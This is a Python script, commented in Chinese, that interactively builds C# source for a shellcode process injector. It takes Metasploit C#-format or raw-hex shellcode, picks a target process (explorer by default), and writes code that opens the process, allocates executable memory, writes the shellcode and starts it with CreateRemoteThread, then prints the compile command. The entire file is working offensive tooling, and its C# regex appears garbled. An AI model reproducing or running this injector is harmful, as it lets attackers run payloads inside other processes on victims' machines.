#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re
import textwrap

def read_shellcode_from_file(filename):
    """从文件中读取shellcode"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
        
        # 尝试匹配C#格式的shellcode
        match = re.search(r'byte$$$$\s*buf\s*=\s*new\s*byte$$\d+$$\s*{(.*?)};', content, re.DOTALL)
        if match:
            shellcode_part = match.group(1)
            # 提取大小和代码
            size_match = re.search(r'new\s*byte$$(\d+)$$', content)
            size = size_match.group(1) if size_match else str(len(re.findall(r'0x[0-9a-fA-F]+', shellcode_part)))
            
            # 清理shellcode
            shellcode_bytes = [b.strip() for b in re.findall(r'0x[0-9a-fA-F]+', shellcode_part)]
            return size, shellcode_bytes
        
        # 如果不是C#格式，尝试原始hex格式
        hex_bytes = re.findall(r'[0-9a-fA-F]{2}', content)
        if hex_bytes:
            shellcode_bytes = [f"0x{b}" for b in hex_bytes]
            return str(len(shellcode_bytes)), shellcode_bytes
        
        raise ValueError("无法识别文件中的shellcode格式")
    
    except Exception as e:
        print(f"[-] 读取文件错误: {str(e)}", file=sys.stderr)
        sys.exit(1)

def get_user_input():
    """交互式获取用户输入"""
    print("\n=== C#进程注入工具生成器 ===")
    print("将生成可直接编译执行的C#源代码\n")
    
    # 获取shellcode来源
    print("选择shellcode来源:")
    print("1. 从文件读取 (csharp-shellcode)")
    print("2. 手动输入 (适合短小shellcode)")
    choice = input("请选择(1/2): ").strip()
    
    size = "0"
    shellcode_bytes = []
    
    if choice == "1":
        input_file = input("输入包含shellcode的文件路径: ").strip()
        if not os.path.isfile(input_file):
            print(f"[-] 文件不存在: {input_file}", file=sys.stderr)
            sys.exit(1)
        size, shellcode_bytes = read_shellcode_from_file(input_file)
    elif choice == "2":
        print("\n粘贴您的MSF C#格式shellcode (byte[] buf = {...}部分):")
        print("(输入完成后按Enter，然后按Ctrl+D结束输入)")
        shellcode = sys.stdin.read().strip()
        
        # 清理shellcode输入
        match = re.search(r'byte$$$$\s*buf\s*=\s*new\s*byte$$(\d+)$$\s*{(.*?)};', shellcode, re.DOTALL)
        if match:
            size = match.group(1)
            shellcode_part = match.group(2)
            shellcode_bytes = [b.strip() for b in re.findall(r'0x[0-9a-fA-F]+', shellcode_part)]
        else:
            print("[-] 无法识别的shellcode格式", file=sys.stderr)
            sys.exit(1)
    else:
        print("[-] 无效选择", file=sys.stderr)
        sys.exit(1)
    
    # 获取其他参数
    default_process = "explorer"
    process_name = input(f"\n输入目标进程名(默认{default_process}): ").strip() or default_process
    
    output_file = "injector.cs"
    output_file = input(f"\n输入输出的C#文件名(默认{output_file}): ").strip() or output_file
    
    return {
        'shellcode': shellcode_bytes,
        'process_name': process_name,
        'output_file': output_file,
        'size': size
    }

def generate_csharp_code(params):
    """生成C#源代码"""
    template = textwrap.dedent("""\
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    
    class Injector
    {{
        // API声明
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
    
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
        // 常量
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
    
        static void Main()
        {{
            Console.WriteLine("[*] 正在注入 {process_name}...");
            
            try
            {{
                // 动态查找进程
                Process[] targets = Process.GetProcessesByName("{process_name}");
                if (targets.Length == 0)
                {{
                    Console.WriteLine("[-] 未找到进程: {process_name}");
                    return;
                }}
    
                // 使用第一个找到的进程
                Process target = targets[0];
                Console.WriteLine($"[+] 找到目标进程: {{target.ProcessName}} (PID: {{target.Id}})");
    
                // 打开进程
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
                if (hProcess == IntPtr.Zero)
                {{
                    Console.WriteLine($"[-] OpenProcess失败 (错误: {{Marshal.GetLastWin32Error()}})");
                    return;
                }}
    
                // 分配内存
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (addr == IntPtr.Zero)
                {{
                    Console.WriteLine($"[-] VirtualAllocEx失败 (错误: {{Marshal.GetLastWin32Error()}})");
                    return;
                }}
    
                // 写入shellcode
                IntPtr bytesWritten;
                if (!WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out bytesWritten))
                {{
                    Console.WriteLine($"[-] WriteProcessMemory失败 (错误: {{Marshal.GetLastWin32Error()}})");
                    return;
                }}
    
                // 创建远程线程
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {{
                    Console.WriteLine($"[-] CreateRemoteThread失败 (错误: {{Marshal.GetLastWin32Error()}})");
                    return;
                }}
    
                Console.WriteLine("[+] 注入成功!");
            }}
            catch (Exception ex)
            {{
                Console.WriteLine($"[-] 错误: {{ex.Message}}");
            }}
        }}
    
        // 您的shellcode
        static byte[] shellcode = new byte[{size}] 
        {{
            {formatted_shellcode}
        }};
    }}
    """)
    
    # 格式化shellcode (每行16个字节)
    shellcode_lines = []
    for i in range(0, len(params['shellcode']), 16):
        line = ", ".join(params['shellcode'][i:i+16])
        shellcode_lines.append(line)
    
    formatted_shellcode = ",\n            ".join(shellcode_lines)
    
    return template.format(
        process_name=params['process_name'],
        size=params['size'],
        formatted_shellcode=formatted_shellcode
    )

def main():
    if len(sys.argv) > 1 and sys.argv[1] in ('-h', '--help'):
        print("使用方法: python generator.py")
        print("交互式生成C#进程注入工具源代码")
        print("支持从文件读取shellcode或手动输入")
        return
    
    try:
        params = get_user_input()
        code = generate_csharp_code(params)
        
        with open(params['output_file'], 'w') as f:
            f.write(code)
        
        print(f"\n[+] 已生成C#源代码: {params['output_file']}")
        print("[*] 编译命令: csc.exe /target:exe /out:injector.exe injector.cs")
        
    except Exception as e:
        print(f"[-] 错误: {str(e)}", file=sys.stderr)
        sys.exit(1)

if __name__ == '__main__':
    main()
